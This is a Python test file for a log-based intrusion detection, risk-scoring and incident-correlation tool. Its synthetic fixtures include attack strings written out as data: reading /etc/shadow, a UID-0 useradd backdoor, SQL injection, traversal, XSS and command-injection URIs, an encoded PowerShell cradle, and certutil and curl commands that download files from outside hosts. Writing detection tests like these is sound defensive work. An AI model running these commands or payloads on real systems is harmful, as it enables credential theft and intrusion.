"""Detection, scoring and correlation tests.

These build small hand-written event frames so each rule is tested on the
exact condition it claims to detect, including the cases it must *not* fire on.
"""
from __future__ import annotations

from datetime import datetime, timedelta

import pandas as pd
import pytest

from correlation import correlate
from detection import DetectionConfig, run_all
from detection import brute_force, privilege, suspicious_login, suspicious_process, web_attack
from detection.base import window_bursts
from parser.schema import (
    AUTH_FAILURE,
    AUTH_SUCCESS,
    LINUX_AUTH,
    PRIVILEGE_USE,
    PROCESS_CREATION,
    WEB_ACCESS,
    WEB_REQUEST,
    WINDOWS_SECURITY,
    Event,
    events_to_frame,
)
from scoring import risk as risk_scoring

BASE = datetime(2026, 9, 18, 10, 0, 0)


def frame(events: list[Event]) -> pd.DataFrame:
    return events_to_frame(events)


def auth(offset_seconds: int, event_type: str, user: str = "admin",
         ip: str = "203.0.113.77", host: str = "web-01") -> Event:
    return Event(
        timestamp=BASE + timedelta(seconds=offset_seconds),
        source=LINUX_AUTH, host=host, source_ip=ip, username=user,
        event_type=event_type,
        status="failure" if event_type == AUTH_FAILURE else "success",
        process="sshd", raw="synthetic",
    )


# --- window helper ---------------------------------------------------------
def test_window_bursts_merges_a_continuous_run():
    stamps = [pd.Timestamp(BASE + timedelta(seconds=i * 2)) for i in range(10)]
    assert window_bursts(stamps, threshold=5, window_minutes=5) == [(0, 9)]


def test_window_bursts_ignores_activity_spread_too_thin():
    stamps = [pd.Timestamp(BASE + timedelta(minutes=i * 10)) for i in range(10)]
    assert window_bursts(stamps, threshold=5, window_minutes=5) == []


def test_window_bursts_needs_the_threshold():
    stamps = [pd.Timestamp(BASE + timedelta(seconds=i)) for i in range(4)]
    assert window_bursts(stamps, threshold=5, window_minutes=5) == []


# --- LH-001 / LH-002 brute force ------------------------------------------
def test_brute_force_fires_above_the_threshold():
    events = frame([auth(i * 2, AUTH_FAILURE) for i in range(17)])
    alerts = brute_force.detect(events, DetectionConfig())
    assert len(alerts) == 1
    alert = alerts[0]
    assert alert.rule_id == "LH-001"
    assert alert.count == 17
    assert alert.username == "admin"
    assert alert.source_ip == "203.0.113.77"
    assert "T1110" in alert.mitre


def test_brute_force_silent_below_the_threshold():
    events = frame([auth(i * 2, AUTH_FAILURE) for i in range(4)])
    assert brute_force.detect(events, DetectionConfig()) == []


def test_brute_force_silent_when_failures_are_spread_over_hours():
    events = frame([auth(i * 3600, AUTH_FAILURE) for i in range(10)])
    assert brute_force.detect(events, DetectionConfig()) == []


def test_brute_force_threshold_is_configurable():
    events = frame([auth(i * 2, AUTH_FAILURE) for i in range(6)])
    assert brute_force.detect(events, DetectionConfig(bf_failure_threshold=20)) == []
    assert brute_force.detect(events, DetectionConfig(bf_failure_threshold=6))


def test_password_spraying_is_reported_instead_of_guessing():
    events = frame([auth(i * 5, AUTH_FAILURE, user=f"user{i}") for i in range(8)])
    alerts = brute_force.detect(events, DetectionConfig())
    assert [a.rule_id for a in alerts] == ["LH-002"]
    assert alerts[0].metadata["distinct_users"] == 8
    assert "T1110.003" in alerts[0].mitre


def test_brute_force_ignores_events_without_a_source_address():
    events = frame([auth(i * 2, AUTH_FAILURE, ip="") for i in range(17)])
    assert brute_force.detect(events, DetectionConfig()) == []


# --- LH-003 compromise ----------------------------------------------------
def test_success_after_failures_is_critical_for_the_same_account():
    events = frame([auth(i * 2, AUTH_FAILURE) for i in range(17)]
                   + [auth(40, AUTH_SUCCESS)])
    alerts = suspicious_login.detect_compromise(events, DetectionConfig())
    assert len(alerts) == 1
    alert = alerts[0]
    assert alert.rule_id == "LH-003"
    assert alert.severity == "critical"
    assert alert.metadata["failed_attempts_same_account"] == 17
    assert set(alert.mitre) == {"T1110", "T1078"}


def test_success_after_failures_on_a_different_account_is_weaker():
    events = frame([auth(i * 2, AUTH_FAILURE, user=f"user{i}") for i in range(17)]
                   + [auth(40, AUTH_SUCCESS, user="admin")])
    alert = suspicious_login.detect_compromise(events, DetectionConfig())[0]
    assert alert.severity == "high"
    assert alert.metadata["confidence"] == "medium"


def test_no_compromise_alert_when_the_success_is_long_after():
    events = frame([auth(i * 2, AUTH_FAILURE) for i in range(17)]
                   + [auth(7200, AUTH_SUCCESS)])
    assert suspicious_login.detect_compromise(events, DetectionConfig()) == []


def test_no_compromise_alert_for_a_clean_login():
    events = frame([auth(0, AUTH_SUCCESS)])
    assert suspicious_login.detect_compromise(events, DetectionConfig()) == []


# --- LH-004 anomalous source ----------------------------------------------
def test_anomalous_source_needs_a_baseline_to_deviate_from():
    events = frame([auth(i * 60, AUTH_SUCCESS, ip="192.168.1.20") for i in range(10)]
                   + [auth(700, AUTH_SUCCESS, ip="203.0.113.77")])
    alerts = suspicious_login.detect_anomalous_source(events, DetectionConfig())
    assert len(alerts) == 1
    assert alerts[0].source_ip == "203.0.113.77"
    assert alerts[0].metadata["external_source"] is True
    assert alerts[0].metadata["baseline_networks"] == ["192.168.1.0/24"]


def test_anomalous_source_silent_for_an_account_with_no_history():
    events = frame([auth(0, AUTH_SUCCESS, ip="192.168.1.20"),
                    auth(60, AUTH_SUCCESS, ip="203.0.113.77")])
    assert suspicious_login.detect_anomalous_source(events, DetectionConfig()) == []


def test_anomalous_source_silent_when_the_source_is_the_norm():
    events = frame([auth(i * 60, AUTH_SUCCESS, ip="192.168.1.20") for i in range(10)])
    assert suspicious_login.detect_anomalous_source(events, DetectionConfig()) == []


# --- LH-005 / LH-006 privilege --------------------------------------------
def sudo(offset_seconds: int, command: str, user: str = "admin") -> Event:
    return Event(
        timestamp=BASE + timedelta(seconds=offset_seconds),
        source=LINUX_AUTH, host="web-01", username=user,
        event_type=PRIVILEGE_USE, status="success", process="sudo",
        command_line=command, action="sudo command executed", raw="synthetic",
    )


def test_privilege_escalation_links_actions_to_the_login_that_enabled_them():
    events = frame([auth(0, AUTH_SUCCESS), sudo(120, "/usr/bin/cat /etc/shadow")])
    alerts = privilege.detect_escalation(events, DetectionConfig())
    assert len(alerts) == 1
    alert = alerts[0]
    assert alert.rule_id == "LH-005"
    assert alert.metadata["seconds_from_login"] == 120
    assert alert.source_ip == "203.0.113.77"
    assert "access to credential files" in alert.metadata["sensitive_activity"]
    assert "T1003.008" in alert.mitre


def test_privilege_escalation_ignores_actions_with_no_preceding_login():
    events = frame([sudo(120, "/usr/bin/apt-get update")])
    assert privilege.detect_escalation(events, DetectionConfig()) == []


def test_routine_sudo_from_inside_stays_low():
    events = frame([
        auth(0, AUTH_SUCCESS, user="alice", ip="192.168.1.20"),
        sudo(60, "/usr/bin/systemctl restart nginx", user="alice"),
    ])
    alert = privilege.detect_escalation(events, DetectionConfig())[0]
    assert alert.severity == "low"


def test_account_creation_is_attributed_to_the_actor_not_the_new_account():
    created = Event(
        timestamp=BASE + timedelta(seconds=130), source=LINUX_AUTH, host="web-01",
        username="svc_backup", event_type=PRIVILEGE_USE, status="success",
        process="useradd", action="account modified by useradd", raw="synthetic",
    )
    events = frame([auth(0, AUTH_SUCCESS),
                    sudo(125, "/usr/sbin/useradd -o -u 0 svc_backup"),
                    created])
    alerts = [a for a in privilege.detect_persistence(events, DetectionConfig())
              if a.rule_id == "LH-006"]
    assert len(alerts) == 1
    assert alerts[0].username == "admin"
    assert alerts[0].metadata["created_account"] == "svc_backup"


def test_cleared_audit_log_is_critical():
    events = frame([Event(
        timestamp=BASE, source=WINDOWS_SECURITY, host="DC01.corp.local",
        username="administrator", event_type=PRIVILEGE_USE, status="success",
        event_code="1102", action="Security audit log cleared", raw="synthetic")])
    alert = privilege.detect_persistence(events, DetectionConfig())[0]
    assert alert.severity == "critical"
    assert "T1070.001" in alert.mitre


# --- LH-008 / LH-009 web ---------------------------------------------------
def request(offset_seconds: int, uri: str, status: int = 200,
            agent: str = "curl/8.0", ip: str = "203.0.113.77") -> Event:
    return Event(
        timestamp=BASE + timedelta(seconds=offset_seconds), source=WEB_ACCESS,
        source_ip=ip, event_type=WEB_REQUEST, http_method="GET", uri=uri,
        http_status=status, user_agent=agent, action="GET " + uri,
        status="success" if status < 400 else "failure", raw="GET " + uri,
    )


@pytest.mark.parametrize("uri,expected", [
    ("/search?q=1 UNION SELECT pw FROM users", "SQL Injection"),
    ("/download?file=../../../etc/hosts", "Path Traversal"),
    ("/view?page=/etc/passwd", "Local File Inclusion"),
    ("/search?q=<script>alert(1)</script>", "Cross-Site Scripting"),
    ("/run?cmd=;cat /etc/hosts", "Command Injection"),
    ("/uploads/evil.php", "Web Shell Access"),
    ("/.git/config", "Sensitive Path Probing"),
])
def test_web_signatures_match_their_class(uri, expected):
    alerts = web_attack.detect_signatures(frame([request(0, uri)]), DetectionConfig())
    assert any(expected in a.name for a in alerts), f"{uri} did not match {expected}"


def test_double_url_encoded_traversal_is_decoded_before_matching():
    uri = "/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
    alerts = web_attack.detect_signatures(frame([request(0, uri)]), DetectionConfig())
    assert any("Path Traversal" in a.name for a in alerts)


def test_ordinary_requests_raise_nothing():
    events = frame([request(i, "/api/v1/products") for i in range(50)])
    assert web_attack.detect_signatures(events, DetectionConfig()) == []


def test_a_successful_response_raises_severity():
    blocked = web_attack.detect_signatures(
        frame([request(0, "/search?q=<script>x</script>", status=403)]),
        DetectionConfig())[0]
    served = web_attack.detect_signatures(
        frame([request(0, "/search?q=<script>x</script>", status=200)]),
        DetectionConfig())[0]
    assert blocked.severity == "medium"
    assert served.severity == "high"
    assert served.metadata["successful_responses"] == 1


def test_scan_detection_needs_a_burst_of_404s():
    quiet = frame([request(i * 3, f"/missing{i}", status=404) for i in range(5)])
    assert web_attack.detect_scanning(quiet, DetectionConfig()) == []

    noisy = frame([request(i * 3, f"/missing{i}", status=404) for i in range(30)])
    alerts = web_attack.detect_scanning(noisy, DetectionConfig())
    assert len(alerts) == 1
    assert alerts[0].rule_id == "LH-009"


def test_a_self_identifying_scanner_is_reported_on_its_own():
    events = frame([request(0, "/", agent="sqlmap/1.8.4")])
    alerts = web_attack.detect_scanning(events, DetectionConfig())
    assert len(alerts) == 1
    assert alerts[0].metadata["scanner_user_agents"] == ["sqlmap/1.8.4"]


# --- LH-010 / LH-011 processes --------------------------------------------
def process(image: str, command: str, user: str = "administrator") -> Event:
    return Event(
        timestamp=BASE, source=WINDOWS_SECURITY, host="DC01.corp.local",
        username=user, event_type=PROCESS_CREATION, event_code="4688",
        process=image, command_line=command, action="New process created",
        status="info", raw="synthetic",
    )


def test_bare_command_shell_is_low_severity():
    alert = suspicious_process.detect_windows_processes(
        frame([process("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c dir")]),
        DetectionConfig())[0]
    assert alert.severity == "low"
    assert "T1059.003" in alert.mitre


def test_encoded_powershell_download_cradle_is_critical():
    alert = suspicious_process.detect_windows_processes(
        frame([process(
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -nop -w hidden -enc SQBFAFgA")]),
        DetectionConfig())[0]
    assert alert.severity == "critical"
    assert "base64-encoded command" in alert.metadata["indicators"]
    assert "T1027" in alert.mitre


def test_certutil_transfer_flags_are_caught():
    alert = suspicious_process.detect_windows_processes(
        frame([process("C:\\Windows\\System32\\certutil.exe",
                       "certutil.exe -urlcache -split -f http://x/t.exe t.exe")]),
        DetectionConfig())[0]
    assert "T1105" in alert.mitre
    assert alert.severity == "critical"


def test_unwatched_binaries_are_not_reported():
    events = frame([process("C:\\Program Files\\Git\\bin\\git.exe", "git.exe pull")])
    assert suspicious_process.detect_windows_processes(events, DetectionConfig()) == []


def test_linux_privileged_commands_use_the_same_indicators():
    events = frame([sudo(0, "/usr/bin/curl -o /tmp/.x http://203.0.113.77/x.sh")])
    alerts = suspicious_process.detect_linux_commands(events, DetectionConfig())
    assert len(alerts) == 1
    assert alerts[0].rule_id == "LH-011"
    assert "T1105" in alerts[0].mitre


# --- scoring ---------------------------------------------------------------
def test_risk_breakdown_always_reconciles_with_the_score():
    events = frame([auth(i * 2, AUTH_FAILURE) for i in range(17)]
                   + [auth(40, AUTH_SUCCESS)])
    config = DetectionConfig()
    for alert in risk_scoring.score_alerts(run_all(events, config), config):
        rows = risk_scoring.explain(alert)
        assert sum(points for _, points in rows) == alert.risk


def test_risk_stays_inside_the_scale():
    events = frame([auth(i * 2, AUTH_FAILURE) for i in range(200)]
                   + [auth(500, AUTH_SUCCESS)])
    config = DetectionConfig()
    for alert in risk_scoring.score_alerts(run_all(events, config), config):
        assert 0 <= alert.risk <= 100
        assert alert.risk_band in ("INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL")


def test_correlation_raises_the_risk_of_an_alert_in_a_chain():
    lone = frame([auth(i * 2, AUTH_FAILURE) for i in range(17)])
    config = DetectionConfig()
    lone_alerts = risk_scoring.score_alerts(run_all(lone, config), config)
    lone_risk = next(a.risk for a in lone_alerts if a.rule_id == "LH-001")

    chained = frame([auth(i * 2, AUTH_FAILURE) for i in range(17)]
                    + [auth(40, AUTH_SUCCESS), sudo(200, "/usr/bin/cat /etc/shadow")])
    chained_alerts = risk_scoring.score_alerts(run_all(chained, config), config)
    correlate(chained_alerts, chained, config)
    chained_risk = next(a.risk for a in chained_alerts if a.rule_id == "LH-001")

    assert chained_risk > lone_risk


# --- correlation -----------------------------------------------------------
def test_one_actor_produces_one_incident_with_ordered_stages():
    events = frame([auth(i * 2, AUTH_FAILURE) for i in range(17)]
                   + [auth(40, AUTH_SUCCESS),
                      sudo(200, "/usr/bin/cat /etc/shadow")])
    config = DetectionConfig()
    alerts = risk_scoring.score_alerts(run_all(events, config), config)
    incidents = correlate(alerts, events, config)

    assert len(incidents) == 1
    incident = incidents[0]
    # Reading /etc/shadow is both a privileged action (LH-005) and a command
    # matching the credential-access indicators (LH-011), so it evidences two
    # stages from the one event.
    assert incident.stage_names == ["Credential Attack", "Successful Access",
                                    "Privilege Escalation", "Execution"]
    assert incident.risk_band == "CRITICAL"
    assert incident.title == "Account Compromise with Post-Access Activity"


def test_two_unrelated_actors_stay_in_separate_incidents():
    events = frame(
        [auth(i * 2, AUTH_FAILURE, ip="203.0.113.77") for i in range(17)]
        + [auth(20000 + i * 2, AUTH_FAILURE, user=f"user{i}", ip="198.51.100.23")
           for i in range(8)]
    )
    config = DetectionConfig()
    alerts = risk_scoring.score_alerts(run_all(events, config), config)
    incidents = correlate(alerts, events, config)
    assert len(incidents) == 2
    assert {i.source_ips[0] for i in incidents} == {"203.0.113.77", "198.51.100.23"}


def test_incident_ids_are_chronological():
    events = frame(
        [auth(i * 2, AUTH_FAILURE, ip="203.0.113.77") for i in range(17)]
        + [auth(20000 + i * 2, AUTH_FAILURE, user=f"u{i}", ip="198.51.100.23")
           for i in range(8)]
    )
    config = DetectionConfig()
    incidents = correlate(risk_scoring.score_alerts(run_all(events, config), config),
                          events, config)
    by_time = sorted(incidents, key=lambda i: i.first_seen)
    assert [i.incident_id for i in by_time] == sorted(i.incident_id for i in incidents)


def test_empty_input_is_handled_everywhere():
    empty = events_to_frame([])
    config = DetectionConfig()
    assert run_all(empty, config) == []
    assert correlate([], empty, config) == []
